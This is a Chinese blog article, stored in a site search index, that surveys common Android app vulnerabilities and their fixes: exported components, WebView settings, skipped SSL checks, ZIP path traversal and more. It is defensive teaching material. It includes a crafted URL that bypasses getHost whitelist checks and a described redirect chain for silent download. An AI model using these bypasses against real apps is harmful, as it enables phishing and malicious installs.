<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Android APP常见安全漏洞</title>
    <link href="/2024/02/18/Android-App-Security-Vulnerabilities/"/>
    <url>/2024/02/18/Android-App-Security-Vulnerabilities/</url>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><strong>Android漏洞可能存在的点</strong>：</p><ol><li>协议——通信协议（本地、网络），协议大部分是由C/C++实现，存在以下安全问题：通信数据引发的逻辑漏洞；通信数据引发的<code>缓冲区溢出</code>等可能导致远程代码执行/拒绝服务的代码漏洞。</li><li>组件安全——Activity，Service服务,Content Provider内容提供者，BroadcastReceiver广播接收器中可能存在的安全问题，其中最主要的就是intent组件通信导致的拒绝服务/越权漏洞。</li><li>开放端口——可通过命令查看各APP运行时存在的开放端口，然后去逆向分析APP查看其在此开放端口上进行的操作，从而找寻可能的漏洞。</li><li>IPC（进程间通信）安全——同1。</li><li>文件读写安全/数据加密安全——Android平台上的隐私泄露也是一个值得关注的攻击面。</li></ol><h2 id="Android-APP常见安全漏洞"><a href="#Android-APP常见安全漏洞" class="headerlink" title="Android APP常见安全漏洞"></a>Android APP常见安全漏洞</h2><p><img src="https://p.sda1.dev/16/eb2ba5b35945e4a672cf3248296a7b20/12.png"></p><h3 id="四大组件"><a href="#四大组件" class="headerlink" title="四大组件"></a>四大组件</h3><p><strong>四大组件的安全问题很大一部分是由于组件设置成导出状态（android:exported=true）引起的。</strong><br>Android 四大组件中，Activity，Service，BroadcastReceiver广播接收器之间都可以通过<code>Intent</code>进行通信，所以他们都存在由Intent传输数据引发的本地拒绝服务漏洞。</p><ol><li><strong>背景知识</strong>：Android系统中的Intent机制负责对应用中一次操作的动作、动作涉及数据、附加数据进行描述，系统则根据此Intent的描述，负责找到对应的组件，将Intent传递给调用的组件，并完成组件的调用。</li><li><strong>产生原理</strong>：Android应用本地拒绝服务漏洞源于程序处理<code>Intent.getXXXExtra()</code>获取的数据时没有进行异常捕获，从而导致攻击者可通过向受害者应用发送此类空数据、异常或者畸形数据来达到使该应用崩溃的目的。</li><li><strong>危害</strong>：</li></ol><ul><li>导致安全防护等应用的防护功能被绕过或失效（如杀毒应用、安全卫士、防盗锁屏等）。</li><li>被竞争方应用利用并攻击，使得己方应用崩溃，造成不同程度的经济利益损失。</li></ul><ol start="4"><li><strong>防护</strong>：</li></ol><ul><li>将不必要的组件设置为不导出，在<code>AndroidMenifest.xml</code>文件中，将相应组件的<code>android:exported</code>属性设置为<code>false</code>，防止引起拒绝服务，尤其是杀毒、安全防护、锁屏防盗等安全应用。</li><li>处理通过<code>Intent.getXXXExtra()</code>获取的数据时进行以下判断，同时用try-catch方式捕获所有异常，以防止应用出现拒绝服务漏洞：空指针异常、类型转换异常、数组越界访问异常、类未定义异常、其他异常。</li></ul><ol start="5"><li><strong>攻击代码示例</strong>：包括NullPointerException异常、ClassCastException异常、IndexOutOfBoundsException异常、ClassNotFoundException异常。</li></ol><h4 id="Activity"><a href="#Activity" class="headerlink" title="Activity"></a><a href="https://www.jianshu.com/p/32938446e4e0">Activity</a></h4><h5 id="组件导出导致钓鱼欺诈"><a href="#组件导出导致钓鱼欺诈" class="headerlink" title="组件导出导致钓鱼欺诈"></a>组件导出导致钓鱼欺诈</h5><h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><p>Android为了提高用户的用户体验，对于不同的应用程序之间的切换，基本上是无缝。他们切换的只是一个Activity，让切换的到前台显示，另一个应用则被覆盖到后台，不可见。Activity的概念相当于一个与用户交互的界面。而Activity的调度是交由Android系统中的AMS管理的。AMS即ActivityManagerService(Activity管理服务),各个应用想启动或停止一个进程，都是先报告给AMS。当AMS收到要启动或停止Activity的消息时，它先更新内部记录，在通知相应的进程运行或停止指定的Activity。当新的Activity启动，前一个Activity就会停止，这些Activity都保留在系统中年的Activity历史栈中。每有一个Activity启动，它就压入历史栈顶，并在手机上显示。当用户按下back键时，顶部Activity弹出，恢复前一个Activity，栈顶指向当前的Activity。由于Activity的这种特性，如果在启动一个Activity时，给它加入一个标志位FLAGACTIVITYNEW_TASK,就能使它置于栈顶并立马呈现给用户。如果这个Activity是用于盗号的伪装Activity，那么就会产生钓鱼安全事件或者是一个Activity中有webview加载，如果允许加载任意网页也有可能会产生钓鱼事件。</p><h6 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h6><p>如果当前的程序进入后台，则需要提示用户当前进程状态。</p><h5 id="隐式启动intent包含敏感数据"><a href="#隐式启动intent包含敏感数据" class="headerlink" title="隐式启动intent包含敏感数据"></a>隐式启动intent包含敏感数据</h5><h6 id="Intent类型"><a href="#Intent类型" class="headerlink" title="Intent类型"></a><a href="https://blog.csdn.net/Kelaker/article/details/80569232">Intent类型</a></h6><ul><li><strong>显式 Intent</strong>：按名称（完全限定类名）指定要启动的组件。 通常，您会在自己的应用中使用显式 Intent 来启动组件，这是因为您知道要启动的 Activity 或服务的类名。例如，启动新 Activity 以响应用户操作，或者启动服务以在后台下载文件。</li></ul><blockquote><p>创建显式 Intent 启动 Activity 或服务时，系统将立即启动 Intent 对象中指定的应用组件。</p></blockquote><ul><li><strong>隐式 Intent</strong> ：不会指定特定的组件，而是声明要执行的常规操作，从而允许其他应用中的组件来处理它。 例如，如需在地图上向用户显示位置，则可以使用隐式 Intent，请求另一具有此功能的应用在地图上显示指定的位置。</li></ul><blockquote><p>创建隐式 Intent 时，Android 系统通过将 Intent 的内容与在设备上其他应用的清单文件中声明的 Intent 过滤器进行比较，从而找到要启动的相应组件。 如果 Intent 与 Intent 过滤器匹配，则系统将启动该组件，并向其传递 Intent 对象。 如果多个 Intent 过滤器兼容，则系统会显示一个对话框，支持用户选取要使用的应用。</p></blockquote><p>对于显式Intent，Android不需要去做解析，因为目标组件已经很明确，Android需要解析的是那些隐式Intent，通过解析，将Intent映射给可以处理此Intent的Activity、IntentReceiver或Service。<br><img src="https://p.sda1.dev/16/d767398f9c81da798d2ce518a239d2e9/5.png"></p><h4 id="Service"><a href="#Service" class="headerlink" title="Service"></a><a href="https://blog.csdn.net/javazejian/article/details/52709857">Service</a></h4><h5 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h5><p> Service(服务)是一个一种可以在后台执行长时间运行操作而没有用户界面的应用组件。服务可由其他应用组件启动（如Activity），服务一旦被启动将在后台一直运行，即使启动服务的组件（Activity）已销毁也不受影响。 此外，组件可以绑定到服务，以与之进行交互，甚至是执行进程间通信 (IPC)。 例如，服务可以处理网络事务、播放音乐，执行文件 I/O 或与内容提供程序交互，而所有这一切均可在后台进行，Service基本上分为两种形式：</p><ol><li><p>启动状态</p><p>当应用组件（如 Activity）通过调用 startService() 启动服务时，服务即处于“启动”状态。一旦启动，服务即可在后台无限期运行，即使启动服务的组件已被销毁也不受影响，除非手动调用才能停止服务， 已启动的服务通常是执行单一操作，而且不会将结果返回给调用方。</p></li><li><p>绑定状态</p><p>当应用组件通过调用 bindService() 绑定到服务时，服务即处于“绑定”状态。绑定服务提供了一个客户端-服务器接口，允许组件与服务进行交互、发送请求、获取结果，甚至是利用进程间通信 (IPC) 跨进程执行这些操作。 仅当与另一个应用组件绑定时，绑定服务才会运行。 多个组件可以同时绑定到该服务，但全部取消绑定后，该服务即会被销毁。</p></li></ol><h5 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h5><p>如果一个导出的 Service没有做严格的限制，任何应用可以去启动并且绑定到这个 Service上，取决于被暴露的功能，这有可能使得一个应用去<strong>执行未授权的行为</strong>，获取敏感信息或者是污染修改内部应用的状态造成威胁。</p><h4 id="Broadcast-receiver"><a href="#Broadcast-receiver" class="headerlink" title="Broadcast receiver"></a><a href="https://www.jianshu.com/p/ca3d87a4cdf3">Broadcast receiver</a></h4><h5 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h5><p>BroadcastReceiver是 Android的四大组件之一，这个组件涉及两个概念：广播发送者和广播接收者。这里的广播实际上指的就是 intent。当发送一个广播时，系统会将发送的广播 (intent)与系统中所有注册的符合条件的接收者的 IntentFilter进行匹配，若匹配成功，则执行相应接收者的 onReceive函数。可以通过两种方式注册广播接收器，一种是在Manifest.xml文件中通过标签静态注册，另一种是通过Context.registerReceiver()动态注册，指定相应的intentfilter参数。而动态注册的广播是默认导出的。</p><h5 id="危害-1"><a href="#危害-1" class="headerlink" title="危害"></a>危害</h5><p>发送广播时如果处理不当，恶意应用便可以<strong>嗅探</strong>、<strong>拦截广播</strong>，致使<strong>敏感数据泄露</strong>等；</p><ul><li>原理：发送的intent没有明确指定接收者，而是简单的通过action匹配。恶意应用可注册一个广播接收者嗅探拦截这个广播。</li><li>防护：使用<code>LocalBroadcastManager.sendBroadcast()</code>发出的广播只能被app自身广播器接收。</li></ul><p>如果接收广播时处理不当，便可导致<strong>拒绝服务攻击</strong>、<strong>伪造消息</strong>、<strong>越权操作</strong>等。</p><h4 id="Content-Provider"><a href="#Content-Provider" class="headerlink" title="Content Provider"></a><a href="https://www.jianshu.com/p/ea8bc4aaf057">Content Provider</a></h4><h5 id="概述-3"><a href="#概述-3" class="headerlink" title="概述"></a>概述</h5><p>Content Provider负责进行<strong>数据交互&amp;共享</strong>，即跨进程通信<br><img src="https://p.sda1.dev/16/5eee352e2127dded73fdb4516abe0e5d/944365-3c4339c5f1d4a0fd.png"></p><h5 id="危害-2"><a href="#危害-2" class="headerlink" title="危害"></a>危害</h5><h6 id="信息泄露漏洞"><a href="#信息泄露漏洞" class="headerlink" title="信息泄露漏洞"></a>信息泄露漏洞</h6><p>如果对Content Provider的权限没有做好控制，就有可能导致恶意程序通过构造Content URI读取App的敏感数据。</p><h6 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h6><p>对Content Provider进行增删改查操作时，程序没有对用户的输入进行过滤，未采用参数化查询的方式，可能导致sql注入攻击。</p><h6 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h6><p>对外暴露的Content Provider组件实现了openFile()接口，并且没有对Content Provider组件的访问进行权限控制，也没有对访问的目标文件的Uri进行有效判断，第三方应用程序可以利用该接口进行文件目录遍历，访问任意可读文件。</p><h4 id="四大组件的安全防护"><a href="#四大组件的安全防护" class="headerlink" title="四大组件的安全防护"></a>四大组件的安全防护</h4><h5 id="Activity-1"><a href="#Activity-1" class="headerlink" title="Activity"></a>Activity</h5><ol><li><p>谨慎处理接收的Intent以及其携带的信息；</p></li><li><p>私有Activity不应被其他应用启动且应该确保相对是安全的；</p></li><li><p>当Activity返回数据时候需注意目标Activity是否有泄露信息的风险，同时谨慎处理Activity返回的数据，目的Activity返回的数据有可能是恶意应用伪造的；</p></li><li><p>目标Activity十分明确时尽量使用显式Intent；</p></li><li><p>验证目标Activity是否属于恶意app，以免受到Intent欺骗，可用hash签名验证；</p></li><li><p>尽可能的不发送敏感信息，应考虑到启动public Activity中Intent的信息均有可能被恶意应用窃取的风险；</p></li><li><p>不需要被外部程序调用的组件应该添加<code>android:exported=&quot;false&quot;</code>属性，这个属性说明它是私有的，只有同一个应用程序的组件或带有相同用户ID的应用程序才能启动或绑定该组件；</p></li><li><p>对于希望Activity能够被特定的外部程序访问，可以为其设置访问权限，具体做法有以下两种：</p><p>①组件添加android：permission属性；</p><p><code>android:permission:&quot;android.perrmission.SEND SMS&quot;</code><br>②protectionLevel权限声明；<br><code>android:protectionLevel=&quot;dangerous&quot;</code></p></li></ol><h5 id="Service-1"><a href="#Service-1" class="headerlink" title="Service"></a>Service</h5><ol><li>私有的service尽量不定义intent-filter并且设置exported属性为false；</li><li>尽量用显式的方式启动service；</li><li>合作service需对合作方的app签名做校验；</li><li>Service接收到的数据需要谨慎处理；</li><li>内部service需使用签名级别的protectionLevel来判断是否为内部应用调用；</li><li>Service不应在onCreate时决定是否提供服务，应在onStartCommand/onBind/onHandleIntent等方法被调用时做判断；</li><li>当service有返回数据时，应判断接收数据的组件是否有信息泄露的风险；</li><li>尽量不发送敏感信息；</li></ol><h5 id="Content-Provider-1"><a href="#Content-Provider-1" class="headerlink" title="Content Provider"></a>Content Provider</h5><ol><li>如果不需要与其他应用程序进行数据共享，就应该在manifest文件中设置<code>android:exported=&quot;false&quot;</code>；</li><li>注意,在API Level低于8时，即使显式地声明了<code>android:exported=&quot;false&quot;</code>，其它应用程序仍然可以访问对应的Content Provider，所以尽量避免使用Level低于8的API；</li><li>需要向外部提供数据的Content Provider需设置访问权限；</li><li>传递给ContentProvider的参数应该被视为不可信的输入，不应该在没有经过任何处理的情况下直接用于SQL查询；</li><li>避免使用SQLiteDatabase对象的execSQL()方法；</li></ol><h5 id="Broadcast-Receiver"><a href="#Broadcast-Receiver" class="headerlink" title="Broadcast Receiver"></a>Broadcast Receiver</h5><ol><li>私有广播接收器设置<code>android:exported=&quot;false&quot;</code>，尽量不配置intent-filter；</li><li>私有广播尽量使用LocalBroadcastManager动态注册和使用；</li><li>暴露的广播接收器需要对数据来源进行权限控制和身份验证；</li><li>广播接收器对于接收的数据要谨慎地使用多种异常来控制数据处理；</li><li>发送广播时如果包含敏感数据则需要显示意图，并通过setPackage()指定接收者包名；</li></ol><h3 id="默认设置漏洞"><a href="#默认设置漏洞" class="headerlink" title="默认设置漏洞"></a>默认设置漏洞</h3><h4 id="AndroidManifest-xml配置文件中默认设置相关问题"><a href="#AndroidManifest-xml配置文件中默认设置相关问题" class="headerlink" title="AndroidManifest.xml配置文件中默认设置相关问题"></a>AndroidManifest.xml配置文件中默认设置相关问题</h4><ol><li>allowBackup默认设置风险（Android 2.1以上的系统可为App提供应用程序数据的备份和恢复功能，AndroidManifest.xml文件中的allowBackup属性值控制，其默认值为true。当该属性没有显式设置为false时，攻击者可通过adb backup和adb restore对App的应用数据进行备份和恢复。）</li><li>Debuggable默认设置风险</li><li>组件默认导出风险</li></ol><h4 id="WebView的默认设置问题"><a href="#WebView的默认设置问题" class="headerlink" title="WebView的默认设置问题"></a>WebView的默认设置问题</h4><p>在 Android开发中，经常会使用 Webview来实现WEB页面的展示，在 Activity中启动自己的浏览器或者简单的展示一些在线内容等。</p><ul><li>setAllowFileAccess()</li><li>setAllowContentAccess()</li><li>setAllowFileAccessFromFileURLs()</li><li>setAllowUniversalAccessFromFileURLs()</li><li>setSavePassword()</li></ul><ol><li>Webview默认开启密码保存功能 mWebview.setSavePassword(true)，如果该功能未关闭，在用户输入密码时，会弹出提示框，询问用户是否保存密码，如果选择“是”，密码会被明文保到<code>/data/data/com.package.name/databases/webview.db</code>，如果手机被root之后，获取roo权限的APP就可以任意读取私有目录下的文件去获取用户的密码，因此建议用户密码需要加密存储。</li><li>Android中默认mWebView.setAllowFileAccess(true)，在File域下，能够执行任意的JavaScript代码，同源策略跨域访问能够对私有目录文件进行访问等。APP对嵌入的 Webview未对file://形式的URL做限制，会导致隐私信息泄露，针对IM类软件会导致聊天信息、联系人等等重要信息泄露，针对浏览器类软件，则更多的是 cookie信息泄露。</li></ol><h3 id="网络相关"><a href="#网络相关" class="headerlink" title="网络相关"></a>网络相关</h3><h4 id="https通信安全漏洞"><a href="#https通信安全漏洞" class="headerlink" title="https通信安全漏洞"></a>https通信安全漏洞</h4><p>在Android中使用SSL/TLS协议，通过校验服务器端证书来实现安全通信。（这里指单向SSL校验，与之对应的是双向SSL校验，双向SSL指的是同时校验客户端和服务器端证书。）<br><strong>https证书不校验漏洞</strong>：忽略SSL证书校验、忽略域名校验、证书颁发机构被攻击导致私钥泄露，导致中间人攻击，攻击者可通过中间人攻击，盗取账户密码明文、聊天内容、通讯地址、电话号码以及信用卡支付信息等敏感信息，甚至通过中间人劫持将原有信息替换成恶意链接或恶意代码程序，以达到远程控制、恶意扣费等攻击意图。</p><h5 id="忽略SSL证书校验"><a href="#忽略SSL证书校验" class="headerlink" title="忽略SSL证书校验"></a>忽略SSL证书校验</h5><h6 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h6><ul><li>在自定义实现X509TrustManager时，checkServerTrusted中没有检查证书是否可信，导致通信过程中可能存在中间人攻击，造成敏感数据劫持危害。</li><li>在重写 WebviewClient的 onReceivedSslError方法时，调用 proceed忽略证书验证错误信息继续加载页面，导致通信过程中可能存在中间人攻击，造成敏感数据劫持危害。</li></ul><h6 id="防护-1"><a href="#防护-1" class="headerlink" title="防护"></a>防护</h6><ol><li>建议自定义实现X509TrustManager时，在 checkServerTrusted中对服务器信息进行严格校验。针对自定义 TrustManager，检查 checkServerTrusted()函数是否为空实现。</li><li>建议不要重写 TrustManager和 HostnameVerifier，使用系统默认的。</li><li>在重写 WebViewClient的。 onReceivedSslError方法时，避兔调用 proceed忽略证书验证错误信息继续加载页面。</li><li>禁止使用proceed()函数忽略证书错误，应该抛给系统进行安全警告。</li></ol><h5 id="忽略域名校验"><a href="#忽略域名校验" class="headerlink" title="忽略域名校验"></a>忽略域名校验</h5><h6 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h6><ul><li>在自定义实现 HostnameVerifier时，没有在verify中进行严格证书校验，导致通信过程中可能存在中间人攻击，造成敏感数据劫持危害。</li><li>在HostnameVerifier方法中使用<code>ALLOW_ALL_HOSTNAME_VERIFIER</code>，信任所有Hostname，导致通信过程中可能存在中间人攻击，造成敏感数据劫持危害。</li></ul><h6 id="防护-2"><a href="#防护-2" class="headerlink" title="防护"></a>防护</h6><ul><li>在自定义实现 HostnameVerifier时，在verify中对Hostname进行严格校验。</li><li>建议在HostnameVerifier方法中使用<code>STRICT_HOSTNAME_VERIFIER</code>进行严格证书校验，避免使用<code>ALLOW_ALL_HOSTNAME_VERIFIER</code>。</li></ul><h4 id="WebView安全漏洞"><a href="#WebView安全漏洞" class="headerlink" title="WebView安全漏洞"></a>WebView安全漏洞</h4><ol><li>远程代码执行漏洞</li><li>UXSS</li><li>Webview设置方面的安全风险</li><li>Webview忽略证书错误漏洞</li><li>Webview File域同源策略绕过漏洞</li></ol><h5 id="WebView设置方面的安全风险"><a href="#WebView设置方面的安全风险" class="headerlink" title="WebView设置方面的安全风险"></a>WebView设置方面的安全风险</h5><ol><li><code>setJavaScriptEnabled()</code>，默认为false，即不允许执行JS代码。<code>webview.getWebSettings().setavaScriptEnabled(true);</code></li><li><code>setPluginState()</code>，它有三个状态值ON、ON DEMAND、OFF，默认为OFF。</li><li><code>setAllowFileAccess()</code>默认为true，即允许从WebView访问本地文件。</li><li><code>setAllowContentAccess()</code>默认为true，即允许从WebView加载Content URL，读取content provider相关内容。</li><li><code>setAllowFileAccessFromFileURLs()</code>，这个函数的作用是在JS没有禁用的情况下，设置是否允许file协议的URL访问其他file协议的URL的文件内容。API15及以下默认值为true，API16及以上默认为false。</li><li><code>setAllowUniversalAccessFromFileURLs()</code>，这个函数的作用是在JS没有禁用的情况下，设置是否允许file协议的URL访问其他任意来源的内容。</li><li><code>setSavePassword()</code>默认值为true，这个函数的作用是设置是否允许WebView自动保存密码。</li></ol><h5 id="Webview-File域同源策略绕过漏洞"><a href="#Webview-File域同源策略绕过漏洞" class="headerlink" title="Webview File域同源策略绕过漏洞"></a>Webview File域同源策略绕过漏洞</h5><h6 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h6><p>浏览器有一个很重要的概念——同源策略(Same-Origin Policy)。所谓同源是指，域名，协议，端口相同。不同源的客户端脚本(JavaScript、 ActionScript)在没明确授权的情况下，不能读写对方的资源。简单的来说，浏览器允许包含在页面A的脚本访问第二个页面B的数据资源，这一切是建立在A和B页面是同源的基础上。同源策略是由 Netscape提出的一个著名的安全策略，现在所有支持 JavaScript的浏览器都会使用这个策略。<br>在Android系统中，APP访问网页一般是使用浏览器或者是使用了 Android系统内置的 webview组件。如果 Webview没有禁止使用file域并且Webview打开了对 JavaScript的支持。通过 Webview对 javascript<br>的延时执行和将当前Html文件删除掉并软连接指向其他文件就可以读取到被符号链接所指的文件，然后通过 JavaScript再次读取HTML文件，即可获取到被符号链接所指的文件。</p><h6 id="防护-3"><a href="#防护-3" class="headerlink" title="防护"></a>防护</h6><ol><li><p>将不必要导出的组件设置为不导出。</p></li><li><p>如果应用的需要导出包含 Webview的组件，禁止使用File域协议。</p><p><code>myWebView.getSettings.setAllowFileAccess(false);</code></p></li><li><p>如果需要使用File协议，禁止File协议调用 JavaScript。</p><p><code>myWebView.getSettings.setavaScriptEnabled(false)</code></p></li></ol><h5 id="WebView安全防护"><a href="#WebView安全防护" class="headerlink" title="WebView安全防护"></a>WebView安全防护</h5><ol><li>手机厂商把手机内置的WebView与google保持更新一致。</li><li>手机厂商把手机内置的浏览器漏洞修补程度要与Google官方保持一致，并且检测个性化自定义的暴露的API接口。</li><li>手机浏览器厂商浏览器漏洞修补程度要与 Google官方保持一致，并且检测个性化自定义的暴露的API接口。</li><li>APP开发人员注意 webview的各项默认设置。</li><li>用户随时把手机的内置 webview以及使用的浏览器更新到最新版本。</li></ol><h4 id="白名单绕过漏洞"><a href="#白名单绕过漏洞" class="headerlink" title="白名单绕过漏洞"></a>白名单绕过漏洞</h4><h5 id="签名白名单绕过"><a href="#签名白名单绕过" class="headerlink" title="签名白名单绕过"></a><a href="https://www.cnblogs.com/rebeyond/p/10916076.html">签名白名单绕过</a></h5><h6 id="关于Android签名"><a href="#关于Android签名" class="headerlink" title="关于Android签名"></a><a href="https://blog.csdn.net/qian1127/article/details/103531761">关于Android签名</a></h6><p>Android签名apk之后，会有一个META-INF文件夹，这里有三个文件:</p><ol><li><p><a href="https://www.cnblogs.com/Gandy/p/7290069.html">MANIFEST.MF</a></p><p>存储的是每一个文件对应的SHA1(或者SHA256)消息摘要算法提取出该文件的摘要然后进行BASE64编码。</p></li><li><p>CERT.SF</p><p>计算这个MANIFEST.MF文件的整体SHA1值，再经过BASE64编码后，记录在CERT.SF主属性块(在文件头上)的<code>SHA1-Digest-Manifest</code>属性值值下。<br>逐条计算MANIFEST.MF文件中每一个块的SHA1，并经过BASE64编码后，记录在CERT.SF中的同名 块中，属性的名字是<code>SHA1-Digest</code>。</p></li><li><p>CERT.RSA</p><p>会把之前生成的 CERT.SF文件，用私钥计算出签名,然后将签名以及包含公钥信息的数字证书一同写入CERTRSA 中保存。CERTRSA是一个满足PKCS7格式的文件。</p></li></ol><p>除了RSA格式的文件还有 CERT.DSA/EC两种格式，Android支持DSA、RSA、EC三种加密算法进行签名，都是用来保存用私钥计算出 CERT.SF文件的数字签名、证书发布机构、有效期、公钥、所有者、签名算法等信息。<br>正常情况下，一个APK中只会生成一个 CERT.RSA/DSA/EC签名文件。但若在APK压缩包中加入其他的签名文件，即可同时存在两个或两个以上的签名文件。</p><h6 id="URL白名单绕过漏洞"><a href="#URL白名单绕过漏洞" class="headerlink" title="URL白名单绕过漏洞"></a>URL白名单绕过漏洞</h6><p>手机应用在特定环境下需要打开外部传入的URL，或者使用外部传入的URL去下载。为了对打开或下载的URL做控制，就需要对域名进行校验。<br>对URL的域名进行校验，一般习惯使用系统API，<code>getHost</code>来获取域名进行字符串比较，但是由于<code>getHost</code>这个系统API的设计缺陷，使其可以被绕过。</p><p><code>[http://192.168.0.11\.163.com/2.html](http://192.168.0.11\.163.com/2.html) </code>这个URL使用getHost得到的域名是<code>192.168.0.11\.163.com</code>，这样在判断是很容易判断为正常域名可以进行访问，但是在实际打开这个URL时，android的webview会将URL解析为<code>[http://192.168.0.1/.163.com/2.html](http://192.168.0.1/.163.com/2.html) </code>来访问，这样.163.com就变为了192.168.0.1这个IP地址下的一个path。这样webview就可能被打开一些不受控制的网页。但是在使用HttpClient等API进行访问时会解析为<code>[http://192.168.0.1.163.com/2.html](http://192.168.0.1.163.com/2.html)</code> 所以此时并不能正常访问。但是由于开发习惯，一般这个对域名进行校验的方法会作为一个公共方法使用，所以建议使用其他方法来判断。<br>对于使用getHost方式获取url进行白名单判断的方式，还有另外一种绕过方式就是url跳转，类似如下的URL跳转都是基于主站的跳转，即便是对于上面提到的这种白名单绕过方式进行了有效限制，但是还是可以进行绕过，由于很多公司对url跳转漏洞都不是很重视，所以结合url跳转漏洞进行的攻击在有的时候也可以达到令人惊奇的程度，危害还是非常严重的，比如说静默下载安装<code>[http://mbs.hao.163.cn/?c=redirect&amp;ur=http://tu.623.cn/7vNo](http://mbs.hao.163.cn/?c=redirect&amp;ur=http://tu.623.cn/7vNo.)</code></p><h4 id="Socket远程连接漏洞"><a href="#Socket远程连接漏洞" class="headerlink" title="Socket远程连接漏洞"></a>Socket远程连接漏洞</h4><p>如果手机开放端口，但是缺少对发送者的身份验证或者是存在权限控制缺陷，导致黑客拿下这个端口的权限，便可以获得手机此端口开放的所有功能。此漏洞只与App有关，不受系统版本影响。</p><h4 id="APK升级漏洞"><a href="#APK升级漏洞" class="headerlink" title="APK升级漏洞"></a>APK升级漏洞</h4><table><thead><tr><th align="center">APP 升级流程</th><th align="center">隐患</th><th align="center">漏洞危害</th></tr></thead><tbody><tr><td align="center">升级API</td><td align="center">升级API未加密</td><td align="center">返回恶意下载地址，可下载恶意APK</td></tr><tr><td align="center">下载API</td><td align="center">下载API未加密</td><td align="center">下载路径被篡改，可下载恶意APK</td></tr><tr><td align="center">程序安装API</td><td align="center">APK本地路径篡改</td><td align="center">安装错误的APK</td></tr></tbody></table><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><h5 id="加密算法是否存在安全缺陷"><a href="#加密算法是否存在安全缺陷" class="headerlink" title="加密算法是否存在安全缺陷"></a>加密算法是否存在安全缺陷</h5><p>客户端与服务器通信或数据存储往往采用一些加密算法来保障数据的安全，但是这些算法本身可能存在缺陷。</p><h6 id="不安全的哈希-加密算法"><a href="#不安全的哈希-加密算法" class="headerlink" title="不安全的哈希/加密算法"></a>不安全的哈希/加密算法</h6><ol><li>MD5哈希算法易遭到已知的哈希冲突攻击。 哈希算法用于确保数据完整性（例如，文件签名或数字证书）时尤其易被攻击。 在这种情况下，攻击者可能会生成两个独立的数据块，以便在不更改哈希值或使相关数字签名无效的情况下，将良性数据替换为恶意数据。</li><li>DES 加密使用的密钥强度较低，可能在一天内被暴力破解。</li><li>RC2 加密容易遭受与密钥相关的攻击，攻击者可以通过这些攻击找出所有密钥值之间的数学关系。</li></ol><h6 id="弱加密算法"><a href="#弱加密算法" class="headerlink" title="弱加密算法"></a>弱加密算法</h6><ol><li>TripleDES 等加密算法和 SHA1 及 RIPEMD160 等哈希算法被视为弱加密算法。</li><li>这些加密算法不能与更现代的对应算法提供同样多的安全保证。</li><li>与更现代的哈希算法相比，加密哈希算法 SHA1 和 RIPEMD160 提供的冲突抗性较低。与更现代的加密算法相比，加密算法 TripleDES 提供的安全位数更少。</li></ol><h5 id="重放攻击风险"><a href="#重放攻击风险" class="headerlink" title="重放攻击风险"></a>重放攻击风险</h5><h6 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h6><p>重放攻击，是指攻击者发送一个目的主机已接收过的包，来达到欺骗系统的目的，主要用于身份认证过程，破坏认证的正确性。攻击者利用网络监听或者其他方式盗取认证凭据，之后再把它重新发给认证服务器。</p><h6 id="防护-4"><a href="#防护-4" class="headerlink" title="防护"></a>防护</h6><p>建议在客户端与服务端通信时加上时间戳或判断是否已登录过等条件，防止重放攻击。</p><h5 id="业务接口是否存在任意权限调用"><a href="#业务接口是否存在任意权限调用" class="headerlink" title="业务接口是否存在任意权限调用"></a>业务接口是否存在任意权限调用</h5><h6 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h6><p>在正常的业务中，敏感功能的接口需要对访问者的身份进行验证，验证通过后才允许调用接口进行操作。接口未做身份验证或身份校验不严，可能导致非授权访问或越权调用。</p><h6 id="防护-5"><a href="#防护-5" class="headerlink" title="防护"></a>防护</h6><ul><li>建议每个用户登陆后使用随机id进行标识，随时更换新id或在通信过程中使用更多参数如时间戳、数字签名等防止用户越权获取到其他用户的订单等信息。采用加密通信如https安全传输也能在一定程度上解决该问题。</li><li>建议在本地做好输入数据的校验，在通信过程中应采用多个参数对某次通信进行标识和记录。保证参数的随机性和机密性，防止攻击者构造出针对系统健壮性进行攻击的请求数据。</li></ul><h3 id="敏感数据泄露"><a href="#敏感数据泄露" class="headerlink" title="敏感数据泄露"></a>敏感数据泄露</h3><ul><li>LogCat输出敏感信息</li><li>敏感数据明文存储于sdcard</li><li>数据库敏感数据明文存储</li><li>Shared preference全局可读写</li><li>敏感信息硬编码</li><li>HTTP敏感信息明文传输</li></ul><h3 id="ZIP解压缩漏洞"><a href="#ZIP解压缩漏洞" class="headerlink" title="ZIP解压缩漏洞"></a>ZIP解压缩漏洞</h3><p>ZIP压缩包文件中允许存在<code>../</code>的字符串，攻击者可通过精心构造ZIP文件，利用多个<code>../</code>从而改变ZIP包中某个文件的存放位置，覆盖替换掉应用原有的文件。如果被覆盖掉的文件是so文件、dex文件或者odex文件，轻则产生本地拒绝服务漏洞，影响应用的可用性，重则可能造成任意代码执行漏洞，危害应用用户的设备安全和信息安全。比如“寄生兽”漏洞，海豚浏览器远程命令执行漏洞，三星默认输入法远程代码执行等。</p><h2 id="Android-APP审计系统"><a href="#Android-APP审计系统" class="headerlink" title="Android APP审计系统"></a>Android APP审计系统</h2><p><img src="https://p.sda1.dev/16/781c2f05c295078a25bb5d48f20c93e2/1.jpg"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/Kelaker/article/details/80569232">https://blog.csdn.net/Kelaker/article/details/80569232</a><br><a href="https://blog.csdn.net/javazejian/article/details/52709857">https://blog.csdn.net/javazejian/article/details/52709857</a><br><a 